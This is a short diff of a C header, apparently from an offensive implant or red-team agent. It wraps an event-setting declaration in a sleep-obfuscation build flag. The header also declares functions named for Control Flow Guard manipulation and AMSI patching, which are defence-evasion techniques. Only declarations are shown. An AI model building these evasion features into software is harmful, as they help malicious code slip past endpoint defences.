@@ -220,9 +220,11 @@ VOID CfgAddressAdd(
     IN PVOID Function
 );
 
+#ifdef SLEEPOBF_USE_TIMER
 BOOL EventSet(
     IN HANDLE Event
 );
+#endif
 
 BOOL BypassPatchAMSI(
     VOID
